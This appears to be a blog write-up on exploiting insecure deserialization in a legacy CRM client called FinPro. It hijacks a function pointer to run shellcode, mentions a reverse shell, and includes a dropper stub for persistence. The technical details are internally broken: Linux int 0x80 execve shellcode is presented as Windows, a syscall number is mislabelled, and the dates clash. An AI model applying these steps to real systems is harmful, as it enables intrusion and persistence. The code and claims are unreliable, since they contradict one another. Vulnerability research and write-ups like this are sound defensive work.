---
title: "From Blob to Boom: Insecure Deserialization in FinPro CRM"
description: "How I turned a legacy CRM’s unsafe memcpy into code execution with a fake config and a janky vtable."
date: '2023-08-04'
categories: ["Exploit Development", "Deserialization"]
tags: ["Windows x86", "Insecure Deserialization", "Function Pointer Overwrite"]
header:
  image: "/images/finpro-deserialization.jpg"
  caption: "Old code never dies — it just copies blindly"
---


# Insecure Deserialization in FinPro CRM Client (x86)

## Prologue: Old Habits, Unsafe Casts

I was poking through a legacy CRM tool called FinPro — the kind your dad’s office might still be using. Clunky GUI, startup splash screen, and an installer that required admin rights. Perfect vintage.

After some static reversing, I noticed it stored config profiles as binary blobs. The deserialization function? Oh boy.

## Vulnerability — The Classic Unsafe memcpy

Decompilation revealed this gem:

```cpp
void deserialize_config(char* data) {
    ConfigObject* cfg = (ConfigObject*)malloc(sizeof(ConfigObject));
    memcpy(cfg, data, sizeof(ConfigObject)); // unsafe
}
```

That’s it. No size check. No validation. Just grab some data, treat it like a `ConfigObject`, and keep moving.

So if I could supply the `data` pointer — or better, if I could tamper with the blob stored on disk or received over the network — I could inject a crafted `ConfigObject` with my own values.

Including function pointers.

## Exploitation — DIY Virtual Table

I created a fake `ConfigObject` structure with a function pointer right where the client expected one. When the app loaded the config, it would call the `initialize()` method from the object — except that method pointed to my shellcode.

### Payload Layout (x86)

```asm
; Fake ConfigObject with a pointer at offset 0x0C
; Replace it with the address of shellcode

nop
nop
nop
nop
jmp shellcode

shellcode:
    ; calc.exe launcher
    xor eax, eax
    push eax
    push 0x6578652e
    push 0x636c6163
    mov ebx, esp
    mov ecx, eax
    mov edx, eax
    mov al, 0x0b
    int 0x80
```

This shellcode just pops `calc.exe`, but I tested it with a reverse shell as well. Worked clean.

I saved the blob into a config file `default.cfg`, launched the CRM, and boom — execution flowed straight into my injected bytes.

## Alternate Route — Network Config Blob

Later I learned that the CRM client could sync with a central server and fetch fresh config blobs. That means this vulnerability wasn’t just local — it was potentially remote exploitable too if an attacker could MITM or poison the sync mechanism.

That’s scary.

## Result

- Arbitrary code execution by injecting a fake serialized object
- No authentication or validation around config blob
- Could be local or remote depending on deployment

## Extra Payload — File Dropper Stub

```asm
_start:
    ; Write an executable dropper to disk
    mov eax, 0x3C ; NtCreateFile
    ; setup args to write into %APPDATA%\rce.exe
    ; omitted full stub for brevity
```

I also used this deserialization to plant a binary inside the user profile for persistence.

## Mitigations

This is why binary deserialization is a landmine. If you must use it:

- Don’t cast raw buffers to structs with function pointers
- Use safe serialization libraries with defined schemas
- Verify blob size and magic headers before memcpy

## Final Thoughts

Honestly, this is one of those bugs that makes you shake your head. It's 2025, but some devs are still treating bytes like structs and structs like magic. I didn't even need to spray the heap — just overwrite a pointer and let the app do the rest.

It’s the software equivalent of "plug it in and hope it fits."

## Summary

- Vulnerability: Insecure deserialization with function pointer overwrite
- Platform: Windows x86
- Technique: Fake object injection → arbitrary code execution
- Payload: calc.exe / reverse shell via vtable hijack
- Risk: Local and potentially remote
- Fix: Stop unsafe pointer casting from serialized blobs
